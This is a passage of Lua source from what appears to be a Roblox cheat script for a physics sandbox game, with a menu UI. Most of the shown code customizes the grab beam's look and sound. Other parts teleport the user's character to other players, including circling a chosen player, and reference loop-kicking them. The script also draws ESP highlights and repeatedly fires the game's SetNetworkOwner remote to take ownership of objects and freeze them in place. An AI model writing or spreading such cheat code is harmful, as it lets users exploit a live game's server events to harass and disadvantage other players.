    end)
end)
SparklerGroup:AddDivider()

local CoconutEnabled = false
local ShapeEnabled = false

SparklerGroup:AddSlider('CoconutAmount', {
    Text = 'Coconut Amount',
    Default = 10,
    Min = 3,
    Max = 25,
    Rounding = 0,
})
SparklerGroup:AddSlider('CoconutDamping', {
    Text = 'Damping',
    Default = 100,
    Min = 1,
    Max = 500,
    Rounding = 0,
})

Players = game:GetService('Players')
RunService = game:GetService('RunService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
LocalPlayer = Players.LocalPlayer
placeLocations = {
    Spawn = CFrame.new(0, -7.35, 0),
    SpawnCave = CFrame.new(-90, 14.6, -314.3),
    GreenHouse = CFrame.new(-538, -7, 74),
    PinkHouse = CFrame.new(-478, -7, -147),
    Barn = CFrame.new(-228, 82, -318),
    BlueHouse = CFrame.new(496, 83, -350),
    ChineseHouse = CFrame.new(542, 123, -93),
    PurpleHouse = CFrame.new(270, -7, 448),
    Factory = CFrame.new(134, 347, 352),
    OtherGreenHouse = CFrame.new(-359, 98, 357),
    BigCave = CFrame.new(-245, 80, 485),
    TrainCave = CFrame.new(536.6, 87.5, -169.5),
    IslandCave = CFrame.new(75.8, 323, 368.5),
    ChineseRoof = CFrame.new(592, 153, -100),
    UfoCave = CFrame.new(29.6, 10.5, -225.8),
    Prison = CFrame.new(195, -7, -561),
    GoodPrison = CFrame.new(569.6, -7, 176.3),
    RuhubsDogAhhPrison = CFrame.new(564, 82.5, 210),
    ExtremelyGoodPrison = CFrame.new(525, 76, 56),
    BlueHouseSlot = CFrame.new(562.2, 85.38, -212.56),
    SpawnSlot = CFrame.new(51.75, -5.3, -121.64),
    HauntedSlot = CFrame.new(164.57, -5.43, 530.97),
    RandomSlot = CFrame.new(-211.65, 85.7, 426.72),
    BeachSlot = CFrame.new(-546.97, -5.3, -41.09),
}
_G.PlaceToTeleport = 'Spawn'
_G.PlayerToTeleport = ''
_G.LoopPlayerTP = false
_G.LockCameraOnPlayer = false
_G.ViewCameraOnPlayer = false
_G.TeleportPlayerOffset = 1
_G.PlayerToTeleportDirection = 'Behind'

function GetPlayerCharacter()
    local player = Players.LocalPlayer

    if player and player.Character and player.Character:FindFirstChild('HumanoidRootPart') and player.Character:FindFirstChildOfClass('Humanoid') then
        return player.Character
    end

    return nil
end
function GetPlayerRoot()
    local character = GetPlayerCharacter()

    if character then
        return character.HumanoidRootPart
    end

    return nil
end
function TeleportPlayer(targetCFrame, priority)
    priority = priority or 0

    if (_G.TP_Priority or 0) <= priority or priority == 0 then
        _G.TP_Priority = priority

        local character = GetPlayerCharacter()

        if character and typeof(targetCFrame) == 'CFrame' then
            local humanoidRootPart = character.HumanoidRootPart
            local humanoid = character:FindFirstChildOfClass('Humanoid')

            humanoidRootPart.CFrame = targetCFrame

            if humanoid.SeatPart == nil or tostring(humanoid.SeatPart.Parent) ~= 'CreatureBlobman' then
                humanoid.Sit = false
            end
        end
    end
end
function IsPlayerKickingWithBlobman()
    local player = Players.LocalPlayer

    if not player or not player.Character then
        return false
    end

    local humanoid = player.Character:FindFirstChildOfClass('Humanoid')

    if humanoid and humanoid.Sit and humanoid.SeatPart and tostring(humanoid.SeatPart.Parent) == 'CreatureBlobman' and _G.LoopKick then
        return true
    end

    return false
end
function teleportplayerfunctionoffset(targetCFrame, playerRootPart, playerModel, playerName)
    local teleportCFrame = nil
    local direction = _G.PlayerToTeleportDirection
    local offset = _G.TeleportPlayerOffset or 1

    if direction == 'Behind' then
        teleportCFrame = CFrame.new(targetCFrame.Position - targetCFrame.LookVector * (offset + 1))
    elseif direction == 'Front' then
        teleportCFrame = CFrame.new(targetCFrame.Position + targetCFrame.LookVector * (offset + 1))
    elseif direction == 'Right' then
        teleportCFrame = CFrame.new(targetCFrame.Position + targetCFrame.RightVector * (offset + 1))
    elseif direction == 'Left' then
        teleportCFrame = CFrame.new(targetCFrame.Position - targetCFrame.RightVector * (offset + 1))
    elseif direction == 'Rotate' and playerRootPart and playerModel then
        local rotationAngle = 0

        while direction == 'Rotate' and _G.LoopPlayerTP and playerModel:IsDescendantOf(workspace) and playerName == _G.PlayerToTeleport do
            rotationAngle = rotationAngle + 0.1
            teleportCFrame = CFrame.new(playerRootPart.Position + Vector3.new(math.clamp(math.cos(rotationAngle), -1, 1), 0, math.clamp(math.sin(rotationAngle), -1, 1)) * (offset + 1), playerRootPart.Position)

            TeleportPlayer(teleportCFrame)
            task.wait()
        end

        return
    end
    if direction ~= 'Rotate' and teleportCFrame then
        TeleportPlayer(teleportCFrame)
    end
end
function GetPlayerList()
    local list = {}

    for _, player in pairs(Players:GetPlayers())do
        if player.UserId ~= Players.LocalPlayer.UserId then
            table.insert(list, player.Name)
        end
    end

    table.sort(list)

    return list
end

Players = game:GetService('Players')
RunService = game:GetService('RunService')
Debris = game:GetService('Debris')
SoundService = game:GetService('SoundService')
LocalPlayer = Players.LocalPlayer
notificationSoundId = 'rbxassetid://97643101798871'
selectedTexture = 'Low Quality'
customTextureId = ''
useSelectedTexture = true
useCustomTexture = false
textureSpeed = 1
textureLength = 1
textureWidth = 0
customGrabSoundId = ''
speedEnabled = false
lengthEnabled = false
widthEnabled = false
beamTransparency = 0
beamCurveEnabled = false
beamCurveAmount = 0
beamFaceCameraEnabled = false
beamColorEnabled = false
beamColor0 = Color3.fromRGB(255, 255, 255)
beamColor1 = Color3.fromRGB(255, 255, 255)
beamLightEnabled = false
beamLightColor = Color3.fromRGB(255, 255, 255)
beamLightRange = 16
beamLightBrightness = 2
beamRainbowEnabled = false
beamRainbowHue = 0
beamRainbowSpeed = 0.5
beamPulseEnabled = false
beamPulseMin = 0
beamPulseMax = 1
beamPulseSpeed = 2
beamSegmentsEnabled = false
beamSegments = 10
beamZOffsetEnabled = false
beamZOffset = 0
beamWidth0 = 0
beamWidth1 = 0
beamWidthLinked = true
beamShadowEnabled = false
beamShadowOffset = Vector3.new(0.2, -0.2, 0)
beamShadowColor = Color3.fromRGB(0, 0, 0)
beamShadowTransp = 0.5
mirrorBeamEnabled = false
beamFlipEnabled = false
beamFlipX = false
beamFlipY = false
heartbeatConnection = nil
syncAccumulator = 0
toggleSyncing = false
rainbowConn = nil
pulseConn = nil
pulseDir = 1
pulseVal = 0
shadowBeam = nil
mirrorBeamObj = nil

local textureIds = {
    ['Low Quality'] = '',
    ['Non-Gamepass'] = 'rbxassetid://8933346550',
    Gamepass = 'rbxassetid://8933355899',
    Chain = 'rbxassetid://81358145120405',
    ['Chain 2'] = 'rbxassetid://132910145874066',
    ['Chain 3'] = 'rbxassetid://128466395060514',
    ['Chain 4'] = 'rbxassetid://73368670987191',
    Rope = 'rbxassetid://78999022056924',
    Spring = 'rbxassetid://18837732116',
    Circle = 'rbxassetid://5367817750',
    ['Circle-Outline'] = 'rbxassetid://12201347372',
    Triangle = 'rbxassetid://4704920160',
    ['Triangle-Outline'] = 'rbxassetid://94666748694025',
    Square = 'rbxassetid://15007588972',
    ['Square-Outline'] = 'rbxassetid://15420927706',
    Heart = 'rbxassetid://89015294175898',
    ['Heart-Outline'] = 'rbxassetid://125373934805238',
    Moon = 'rbxassetid://9013498676',
    Dots = 'rbxassetid://9169659357',
    Bubble = 'rbxassetid://1249690853',
    Star = 'rbxassetid://5639840603',
    Robux = 'rbxassetid://11560341132',
    ['Roblox-Logo'] = 'rbxassetid://12348119032',
    Brick = 'rbxassetid://4430903072',
    Studs = 'rbxassetid://15539356451',
    Fire = 'rbxassetid://18654087326',
    Lazar = 'rbxassetid://8922958725',
    ['Spider-Web'] = 'rbxassetid://123815660139244',
    Smoke = 'rbxassetid://12900071392',
    ['Audio-Visualiser'] = 'rbxassetid://81588563590679',
    Pulse = 'rbxassetid://82163767314193',
    Arrow = 'rbxassetid://9006027964',
    ['Arrow 2'] = 'rbxassetid://10249261576',
}
local textureValues = {
    'Low Quality',
    'Non-Gamepass',
    'Gamepass',
    'Chain',
    'Chain 2',
    'Chain 3',
    'Chain 4',
    'Rope',
    'Spring',
    'Circle',
    'Circle-Outline',
    'Triangle',
    'Triangle-Outline',
    'Square',
    'Square-Outline',
    'Heart',
    'Heart-Outline',
    'Moon',
    'Dots',
    'Bubble',
    'Star',
    'Robux',
    'Roblox-Logo',
    'Brick',
    'Studs',
    'Fire',
    'Lazar',
    'Spider-Web',
    'Smoke',
    'Audio-Visualiser',
    'Pulse',
    'Arrow',
    'Arrow 2',
}

function cleanId(text)
    return tostring(text or ''):gsub('%D', '')
end
function toAssetId(id)
    id = cleanId(id)

    return id ~= '' and 'rbxassetid://' .. id or ''
end
function playNotificationSound()
    local s = Instance.new('Sound')

    s.SoundId = notificationSoundId
    s.Volume = 1
    s.RollOffMaxDistance = 10000
    s.Parent = SoundService

    pcall(function()
        s:Play()
    end)
    Debris:AddItem(s, 3)
end
function notify(title, body, dur)
    pcall(function()
        Library:Notify({
            Title = title,
            Description = body or '',
            Time = dur or 4,
        })
    end)
    playNotificationSound()
end
function notifyLineChanged(name)
    notify('<b>UNSTABLE</b>', 'Now using: ' .. tostring(name), 3)
end
function getBeamPart()
    local gp = workspace:FindFirstChild('GrabParts')

    return gp and gp:FindFirstChild('BeamPart')
end
function getGrabPart()
    local gp = workspace:FindFirstChild('GrabParts')

    return gp and gp:FindFirstChild('GrabPart')
end
function captureOriginalSoundId(s)
    if s and s:IsA('Sound') and s:GetAttribute('OriginalSoundId') == nil then
        s:SetAttribute('OriginalSoundId', s.SoundId or '')
    end
end
function setSoundId(s, newId)
    if not s or not s:IsA('Sound') or not newId or newId == '' then
        return
    end
    if s.SoundId == newId then
        return
    end

    local wasPlaying = s.IsPlaying

    pcall(function()
        s:Stop()
    end)

    s.SoundId = newId

    if wasPlaying then
        pcall(function()
            s.TimePosition = 0

            s:Play()
        end)
    end
end
function restoreOriginalSound(s)
    if not s or not s:IsA('Sound') then
        return
    end

    captureOriginalSoundId(s)

    local orig = s:GetAttribute('OriginalSoundId')

    if orig and orig ~= '' and s.SoundId ~= orig then
        setSoundId(s, orig)
    end
end
function setLineMode(mode)
    if toggleSyncing then
        return
    end

    toggleSyncing = true

    if mode == 'selected' then
        useSelectedTexture = true
        useCustomTexture = false

        if Options.UseSelectedTexture then
            Options.UseSelectedTexture:SetValue(true)
        end
        if Options.UseCustomTexture then
            Options.UseCustomTexture:SetValue(false)
        end
    elseif mode == 'custom' then
        useSelectedTexture = false
        useCustomTexture = true

        if Options.UseSelectedTexture then
            Options.UseSelectedTexture:SetValue(false)
        end
        if Options.UseCustomTexture then
            Options.UseCustomTexture:SetValue(true)
        end
    end

    toggleSyncing = false
end
function ensureValidTextureMode()
    local hasCustom = cleanId(customTextureId) ~= ''

    if useCustomTexture and not hasCustom then
        setLineMode('selected')
    elseif not useSelectedTexture and not useCustomTexture then
        setLineMode(hasCustom and 'custom' or 'selected')
    end
end
function getActiveTexture()
    ensureValidTextureMode()

    if useCustomTexture then
        local ct = toAssetId(customTextureId)

        if ct ~= '' then
            return ct, 'Custom'
        end
    end

    return textureIds[selectedTexture] or '', selectedTexture
end
function updateShadowBeam()
    local beamPart = getBeamPart()

    if not beamPart then
        return
    end

    local beam = beamPart:FindFirstChild('GrabBeam')

    if not beam then
        return
    end
    if beamShadowEnabled then
        if not shadowBeam or not shadowBeam.Parent then
            shadowBeam = beam:Clone()
            shadowBeam.Name = '<b>UNSTABLE</b>_ShadowBeam'
            shadowBeam.Parent = beamPart
        end

        shadowBeam.Color = ColorSequence.new(beamShadowColor, beamShadowColor)
        shadowBeam.Transparency = NumberSequence.new(beamShadowTransp)
        shadowBeam.ZOffset = (beamZOffsetEnabled and beamZOffset or 0) - 0.05
    else
        if shadowBeam then
            shadowBeam:Destroy()

            shadowBeam = nil
        end
    end
end
function updateMirrorBeam()
    local beamPart = getBeamPart()

    if not beamPart then
        return
    end

    local beam = beamPart:FindFirstChild('GrabBeam')

    if not beam then
        return
    end
    if mirrorBeamEnabled then
        if not mirrorBeamObj or not mirrorBeamObj.Parent then
            mirrorBeamObj = beam:Clone()
            mirrorBeamObj.Name = '<b>UNSTABLE</b>_MirrorBeam'
            mirrorBeamObj.Parent = beamPart
        end

        mirrorBeamObj.CurveSize0 = -beam.CurveSize0
        mirrorBeamObj.CurveSize1 = -beam.CurveSize1
        mirrorBeamObj.ZOffset = (beamZOffsetEnabled and beamZOffset or 0) + 0.02
    else
        if mirrorBeamObj then
            mirrorBeamObj:Destroy()

            mirrorBeamObj = nil
        end
    end
end
function applyLineSettings()
    local beamPart = getBeamPart()

    if not beamPart then
        return
    end

    local beam = beamPart:FindFirstChild('GrabBeam')

    if not beam or not beam:IsA('Beam') then
        return
    end

    beam.Texture = getActiveTexture()

    if speedEnabled then
        beam.TextureSpeed = textureSpeed
    end
    if lengthEnabled then
        beam.TextureLength = textureLength
    end
    if widthEnabled then
        beam.Width0 = beamWidth0
        beam.Width1 = beamWidthLinked and beamWidth0 or beamWidth1
    end

    beam.Transparency = NumberSequence.new(beamPulseEnabled and pulseVal or beamTransparency)

    if beamCurveEnabled then
        local curve = beamCurveAmount
        local dir = beamCurveDirection or 1

        beam.CurveSize0 = curve * dir
        beam.CurveSize1 = curve * dir
    else
        beam.CurveSize0 = 0
        beam.CurveSize1 = 0
    end

    beam.FaceCamera = beamFaceCameraEnabled

    if beamZOffsetEnabled then
        beam.ZOffset = beamZOffset
    else
        beam.ZOffset = 0
    end
    if beamSegmentsEnabled then
        beam.Segments = beamSegments
    end
    if beamFlipEnabled then
        local sx = beamFlipX and -1 or 1
        local sy = beamFlipY and -1 or 1

        beam.TextureSpeed = textureSpeed * sx
        beam.Width0 = beam.Width0 * sy
    end
    if not beamRainbowEnabled then
        if beamColorEnabled then
            beam.Color = ColorSequence.new(beamColor0, beamColor1)
        end
    end
    if beamLightEnabled then
        local pl = beamPart:FindFirstChild('<b>UNSTABLE</b>_BeamLight') or Instance.new('PointLight')

        pl.Name = '<b>UNSTABLE</b>_BeamLight'
        pl.Color = beamLightColor
        pl.Range = beamLightRange
        pl.Brightness = beamLightBrightness
        pl.Parent = beamPart
    else
        local pl = beamPart:FindFirstChild('<b>UNSTABLE</b>_BeamLight')

        if pl then
            pl:Destroy()
        end
    end

    updateShadowBeam()
    updateMirrorBeam()
end
function applyGrabSound()
    local gp = getGrabPart()

    if not gp then
        return
    end

    local s = gp:FindFirstChild('AttachSound')

    if not s or not s:IsA('Sound') then
        return
    end

    captureOriginalSoundId(s)

    local custom = toAssetId(customGrabSoundId)

    if custom ~= '' then
        setSoundId(s, custom)
    else
        restoreOriginalSound(s)
    end
end
function setRainbowBeam(state)
    beamRainbowEnabled = state

    if rainbowConn then
        rainbowConn:Disconnect()

        rainbowConn = nil
    end
    if not state then
        return
    end

    rainbowConn = RunService.Heartbeat:Connect(function(dt)
        beamRainbowHue = (beamRainbowHue + dt * beamRainbowSpeed) % 1

        local c = Color3.fromHSV(beamRainbowHue, 1, 1)
        local beamPart = getBeamPart()

        if not beamPart then
            return
        end

        local beam = beamPart:FindFirstChild('GrabBeam')

        if beam and beam:IsA('Beam') then
            beam.Color = ColorSequence.new(c, c)
        end
        if mirrorBeamObj and mirrorBeamObj.Parent then
            mirrorBeamObj.Color = ColorSequence.new(c, c)
        end
    end)
end
function connectHeartbeat()
    if heartbeatConnection then
        return
    end

    heartbeatConnection = RunService.Heartbeat:Connect(function(dt)
        applyLineSettings()

        syncAccumulator += dt

        if syncAccumulator >= 0.15 then
            syncAccumulator = 0

            applyGrabSound()
        end
    end)
end

workspace.DescendantAdded:Connect(function(d)
    if d:IsA('Beam') and d.Name == 'GrabBeam' then
        task.defer(applyLineSettings)
    elseif d:IsA('Sound') and d.Name == 'AttachSound' then
        captureOriginalSoundId(d)
        task.defer(applyGrabSound)
    elseif d.Name == 'GrabPart' or d.Name == 'BeamPart' then
        task.defer(function()
            applyLineSettings()
            applyGrabSound()
        end)
    end
end)

local LineGroup = Tabs.Grab:AddLeftGroupbox('Line', 'link')

LineGroup:AddDropdown('TextureDropdown', {
    Text = 'Decal',
    Values = textureValues,
    Default = 1,
    Callback = function(v)
        selectedTexture = v

        connectHeartbeat()
        applyLineSettings()
    end,
})
LineGroup:AddCheckbox('UseSelectedTexture', {
    Text = 'Enable',
    Callback = function(v)
        useSelectedTexture = v

        if v then
            useCustomTexture = false
        end

        connectHeartbeat()
        applyLineSettings()
    end,
})
LineGroup:AddCheckbox('EnableBeamColor', {
    Text = 'Color',
    Callback = function(v)
        beamColorEnabled = v

        applyLineSettings()
    end,
})
LineGroup:AddLabel('Start'):AddColorPicker('BeamColor0', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(c)
        beamColor0 = c

        applyLineSettings()
    end,
})
LineGroup:AddLabel('End'):AddColorPicker('BeamColor1', {
    Default = Color3.fromRGB(255, 255, 255),
    Callback = function(c)
        beamColor1 = c

        applyLineSettings()
    end,
})
LineGroup:AddCheckbox('Rainbow', {
    Text = 'Rainbow',
    Callback = function(v)
        setRainbowBeam(v)
    end,
})

Players = game:GetService('Players')
Workspace = game:GetService('Workspace')
TweenService = game:GetService('TweenService')
ReplicatedStorage = game:GetService('ReplicatedStorage')
ContextActionService = game:GetService('ContextActionService')
LocalPlayer = game:GetService('Players').LocalPlayer
SpawnedToys = Workspace:WaitForChild(LocalPlayer.Name .. 'SpawnedInToys')
DeleteToyRE = ReplicatedStorage:WaitForChild('MenuToys'):WaitForChild('DestroyToy')
SetNetworkOwnerRE = ReplicatedStorage:WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner')
AnchoredObjects = {}
CompiledGroups = {}
SB_LineTransparencyValue = Instance.new('NumberValue')
SB_SurfaceTransparencyValue = Instance.new('NumberValue')
SB_AnchoredColor3 = Instance.new('Color3Value')
SB_AnchoredColor3Surface = Instance.new('Color3Value')
SB_GlueColor3 = Instance.new('Color3Value')
SB_GlueColor3Surface = Instance.new('Color3Value')
SB_MainGlueColor3 = Instance.new('Color3Value')
SB_MainGlueColor3Surface = Instance.new('Color3Value')
SB_LineTransparencyValue.Value = 0
SB_SurfaceTransparencyValue.Value = 0.5
SB_AnchoredColor3.Value = Color3.fromRGB(194, 194, 194)
SB_AnchoredColor3Surface.Value = Color3.fromRGB(209, 0, 0)
SB_GlueColor3.Value = Color3.fromRGB(255, 0, 57)
SB_GlueColor3Surface.Value = Color3.fromRGB(244, 244, 244)
SB_MainGlueColor3.Value = Color3.fromRGB(123, 85, 38)
SB_MainGlueColor3Surface.Value = Color3.fromRGB(0, 244, 36)
ESPEnabled = {
    Anchored = false,
    Group = false,
}
AutoRecoverEnabled = false
RecoverCoroutine = nil

function RecoverParts()
    while AutoRecoverEnabled do
        success, err = pcall(function()
            character = LocalPlayer.Character

            if character and character:FindFirstChild('Head') and character:FindFirstChild('HumanoidRootPart') then
                humanoidRootPart = character.HumanoidRootPart

                for model, data in pairs(AnchoredObjects)do
                    coroutine.wrap(function()
                        if model and data.PartAnchored then
                            part = data.PartAnchored
                            distance = (part.Position - humanoidRootPart.Position).Magnitude

                            if distance > 30 then
                                partOwner = part:FindFirstChild('PartOwner')

                                if not partOwner or partOwner.Value ~= LocalPlayer.Name then
                                    humanoidRootPart.CFrame = CFrame.new(part.Position + Vector3.new(0, 5, 0))

                                    task.wait(0.1)
                                    SetNetworkOwnerRE:FireServer(part, lookAt(humanoidRootPart.Position, part.Position))
                                end
                            else
                                partOwner = part:FindFirstChild('PartOwner')

                                if not partOwner or partOwner.Value ~= LocalPlayer.Name then
                                    SetNetworkOwnerRE:FireServer(part, lookAt(humanoidRootPart.Position, part.Position))
                                end
                            end
                        end
                    end)()
                end
                for _, groupData in ipairs(CompiledGroups)do
                    if groupData.primaryPart then
                        coroutine.wrap(function()
                            primaryModel = groupData.primaryPart

                            if primaryModel then
                                primaryPart = primaryModel.PrimaryPart or primaryModel:FindFirstChildOfClass('BasePart')

                                if primaryPart then
                                    distance = (primaryPart.Position - humanoidRootPart.Position).Magnitude

                                    if distance > 30 then
                                        partOwner = primaryPart:FindFirstChild('PartOwner')

                                        if not partOwner or partOwner.Value ~= LocalPlayer.Name then
                                            humanoidRootPart.CFrame = CFrame.new(primaryPart.Position + Vector3.new(0, 5, 0))

                                            task.wait(0.1)
                                            SetNetworkOwnerRE:FireServer(primaryPart, lookAt(humanoidRootPart.Position, primaryPart.Position))
                                        end
                                    else
                                        partOwner = primaryPart:FindFirstChild('PartOwner')

                                        if not partOwner or partOwner.Value ~= LocalPlayer.Name then
                                            SetNetworkOwnerRE:FireServer(primaryPart, lookAt(humanoidRootPart.Position, primaryPart.Position))
                                        end
                                    end
                                end
                            end
                        end)()
                    end
                end
            end
        end)

        task.wait(0.05)
    end
end
function CreateESP(object, espType)
    if not object or not object:IsA('Model') and not object:IsA('BasePart') then
        return
    end

    existingESP = object:FindFirstChild('ESP_' .. espType)

    if existingESP then
        existingESP:Destroy()
    end

    highlight = Instance.new('Highlight')
    highlight.Name = 'ESP_' .. espType
    highlight.Adornee = object
    highlight.FillTransparency = 0.5
    highlight.OutlineTransparency = 0

    if espType == 'Anchored' then
        highlight.FillColor = Color3.fromRGB(194, 194, 194)
        highlight.OutlineColor = Color3.fromRGB(209, 0, 0)
    elseif espType == 'Group' then
        highlight.FillColor = Color3.fromRGB(255, 0, 57)
        highlight.OutlineColor = Color3.fromRGB(244, 244, 244)
    end

    highlight.Parent = object

    return highlight
end
function RemoveESP(object, espType)
    if not object then
        return
    end

    existingESP = object:FindFirstChild('ESP_' .. espType)

    if existingESP then
        existingESP:Destroy()
    end
end
function UpdateAllESP()
    for model, data in pairs(AnchoredObjects)do
        if ESPEnabled.Anchored and model:GetAttribute('IsAnchored') and not IsInCompileGroup(model) then
            CreateESP(model, 'Anchored')
        else
            RemoveESP(model, 'Anchored')
        end
    end
    for _, groupData in ipairs(CompiledGroups)do
        if groupData.primaryPart then
            for _, item in pairs(groupData.group)do
                if ESPEnabled.Group then
                    CreateESP(item.model, 'Group')
                else
                    RemoveESP(item.model, 'Group')
                end
            end
        end
    end
end
function lookAt(position, target)
    direction = (target - position).Unit
    right = direction:Cross(Vector3.new(0, 1, 0))
    up = right:Cross(direction)

    return CFrame.fromMatrix(position, right, up)
end
function SetNetworkOwnership(part)
    if part and typeof(part) == 'Instance' then
        distance = LocalPlayer:DistanceFromCharacter(part.Position)

        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and distance <= 30 then
            SetNetworkOwnerRE:FireServer(part, lookAt(LocalPlayer.Character.HumanoidRootPart.Position, part.Position))
        end
    end
end
function CheckNetworkOwnerShipOnPart(part, returnOwner)
    if typeof(part) == 'Instance' and part:FindFirstChild('PartOwner') and part.PartOwner.Value == LocalPlayer.Name then
        return not returnOwner and true or part.PartOwner
    end
end
function SetNetworkOwnershipOnce(part)
    distance = LocalPlayer:DistanceFromCharacter(part.Position)

    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
        if CheckNetworkOwnerShipOnPart(part) then
            return true
        end
        if distance <= 30 then
            SetNetworkOwnerRE:FireServer(part, lookAt(LocalPlayer.Character.HumanoidRootPart.Position, part.Position))
        end
    end
end
function GetDistanceFromCharacter(position)
    return LocalPlayer:DistanceFromCharacter(position)
end
function AnchorObjectEffect(part)
    attachment = Instance.new('Attachment')
    sound = Instance.new('Sound', attachment)
    sound.Name = 'soundeffect'
    sound.SoundId = 'rbxassetid://17481582653'
    attachment.Parent = part

    attachment.soundeffect:Play()
    game:GetService('Debris'):AddItem(attachment)
end
function ChangeSBstate(selectionBox, state)
    if typeof(selectionBox) == 'Instance' and selectionBox:IsA('SelectionBox') then
        selectionBox:SetAttribute('SB_State', state)

        if state == 'Anchored' then
            selectionBox.Color3 = SB_AnchoredColor3.Value
            selectionBox.SurfaceColor3 = SB_AnchoredColor3Surface.Value
        elseif state == 'Glue' then
            selectionBox.Color3 = SB_GlueColor3.Value
            selectionBox.SurfaceColor3 = SB_GlueColor3Surface.Value
        elseif state == 'GluePrimary' then
            selectionBox.Color3 = SB_MainGlueColor3.Value
            selectionBox.SurfaceColor3 = SB_MainGlueColor3Surface.Value
        else
            selectionBox.Color3 = Color3.fromRGB(111, 32, 12)
            selectionBox.SurfaceColor3 = Color3.fromRGB(163, 12, 0)
        end
    end
end
function setanchorObject(part)
    if typeof(part) == 'Instance' and part.Parent and (part.Parent:IsA('Model') or part.Parent:IsA('Folder')) then
        parentModel = part.Parent

        if parentModel:IsA('Folder') or parentModel == Workspace then
            parentModel = part
        end
        if parentModel:GetAttribute('IsAnchored') or parentModel:GetAttribute('Glue') then
            unAnchorObject(part)
        else
            bodyPosition = parentModel:FindFirstChild('AnchorPositionBody') or part:FindFirstChild('AnchorPositionBody') or Instance.new('BodyPosition')
            bodyGyro = parentModel:FindFirstChild('AnchorGyroBody') or part:FindFirstChild('AnchorGyroBody') or Instance.new('BodyGyro')
            selectionBox = parentModel:FindFirstChild('ObjectState') or Instance.new('SelectionBox')
            connections = {}
            maxTorque = Vector3.new(math.huge, math.huge, math.huge)
            zeroVector = Vector3.new(0, 0, 0)
            originalPosition = part.Position
            bodyPosition.Name = 'AnchorPositionBody'
            bodyPosition.Position = part.Position
            bodyPosition.Parent = part
            bodyGyro.Name = 'AnchorGyroBody'
            bodyGyro.Parent = part
            bodyGyro.CFrame = part.CFrame
            bodyGyro.D = 950
            bodyGyro.P = 40000
            bodyPosition.P = 40000
            bodyPosition.D = 950
            selectionBox.Name = 'ObjectState'
            selectionBox.LineThickness = 0.025
            selectionBox.SurfaceTransparency = SB_SurfaceTransparencyValue.Value
            selectionBox.Transparency = SB_LineTransparencyValue.Value
            selectionBox.Visible = true
            selectionBox.Parent = parentModel
            selectionBox.Adornee = parentModel

            function EnableAnchor()
                if parentModel:GetAttribute('IsAnchored') or parentModel:GetAttribute('Glue') then
                    bodyGyro.MaxTorque = maxTorque
                    bodyPosition.MaxForce = maxTorque
                end
                if parentModel:GetAttribute('GluePrimary') and not parentModel:GetAttribute('IsAnchored') then
                    ChangeSBstate(selectionBox, 'GluePrimary')
                elseif parentModel:GetAttribute('Glue') and not parentModel:GetAttribute('IsAnchored') then
                    ChangeSBstate(selectionBox, 'Glue')
                else
                    ChangeSBstate(selectionBox, 'Anchored')
                end
            end
            function DisableAnchor()
                bodyGyro.MaxTorque = Vector3.new()
                bodyPosition.MaxForce = Vector3.new()

                ChangeSBstate(selectionBox)
                parentModel:SetAttribute('AnchorOwnership', false)
            end

            connections[1] = parentModel.DescendantAdded:Connect(function(descendant)
                if descendant.Name == 'PartOwner' then
                    if descendant.Value ~= LocalPlayer.Name then
                        DisableAnchor()
                    else
                        EnableAnchor()
                    end
                end
            end)
            connections[2] = parentModel.DescendantRemoving:Connect(function(descendant)
                if descendant.Name == 'PartOwner' and descendant.Value == LocalPlayer.Name then
                    DisableAnchor()
                end
            end)

            task.spawn(function()
                while bodyPosition.Parent and not parentModel:GetAttribute('Glue') do
                    if parentModel:GetAttribute('IsAnchored') then
                        bodyGyro.MaxTorque = maxTorque
                        bodyPosition.MaxForce = maxTorque
                    else
                        bodyGyro.MaxTorque = zeroVector
                        bodyPosition.MaxForce = zeroVector
                    end

                    bodyPosition.Position = originalPosition + Vector3.new(0, 0.001, 0)

                    task.wait()

                    bodyPosition.Position = originalPosition
                end
            end)

            AnchoredObjects[parentModel] = {
                BodyPosition = bodyPosition,
                BodyGyro = bodyGyro,
                PartAnchored = part,
                SB = selectionBox,
                Connections = connections,
                Model = parentModel,
            }

            AnchorObjectEffect(part)
            parentModel:SetAttribute('IsAnchored', true)
            EnableAnchor()

            if ESPEnabled.Anchored then
                CreateESP(parentModel, 'Anchored')
            end
        end
    end
end
function unAnchorObject(part)
    if typeof(part) == 'Instance' and part.Parent and (part.Parent:IsA('Model') or part.Parent:IsA('Folder')) then
        parentModel = part.Parent
        isAnchored = parentModel:GetAttribute('IsAnchored')
        isGluePrimary = parentModel:GetAttribute('GluePrimary')

        if not parentModel:IsA('Folder') and parentModel ~= Workspace then
            part = parentModel
        end
        if AnchoredObjects[part] and isAnchored then
            data = AnchoredObjects[part]
            data.BodyPosition.Parent = part
            data.BodyGyro.Parent = part
            data.PartAnchored = nil

            if isGluePrimary then
                ChangeSBstate(data.SB, 'GluePrimary')
            else
                data.SB.Visible = false
            end

            for _, connection in pairs(data.Connections)do
                connection:Disconnect()
            end

            part:SetAttribute('IsAnchored', false)
            part:SetAttribute('AnchorOwnership', false)
            RemoveESP(part, 'Anchored')

            if not isGluePrimary then
                AnchoredObjects[part] = nil
            end
        end
    end
end
function DisconnectObject(model)
    if typeof(model) == 'Instance' and AnchoredObjects[model] then
        data = AnchoredObjects[model]
        data.BodyPosition.Parent = model
        data.BodyGyro.Parent = model
        data.PartAnchored = nil
        data.SB.Visible = false

        for _, connection in pairs(data.Connections)do
            connection:Disconnect()
        end

        model:SetAttribute('IsAnchored', nil)
        model:SetAttribute('AnchorOwnership', nil)
        model:SetAttribute('Glue', nil)
        model:SetAttribute('GluePrimary', nil)
        RemoveESP(model, 'Anchored')
        RemoveESP(model, 'Group')

        AnchoredObjects[model] = nil
    end
end
function unAnchorAll()
    for _, data in pairs(AnchoredObjects)do
        if typeof(data.PartAnchored) == 'Instance' then
            unAnchorObject(data.PartAnchored)
        end
    end
end
function anchorfunc()
    grabParts = Workspace:FindFirstChild('GrabParts')

    function IsValidPart(part)
        if part and not (part:IsDescendantOf(Workspace.Map) or part.Anchored) then
            return true
        end
    end

    if grabParts then
        heldPart = grabParts.GrabPart.WeldConstraint.Part1

        if IsValidPart(heldPart) then
            setanchorObject(heldPart)
        end
    elseif LocalPlayer.Character then
        character = LocalPlayer.Character
        camPartName = LocalPlayer.Character and 'CamPart' or nil
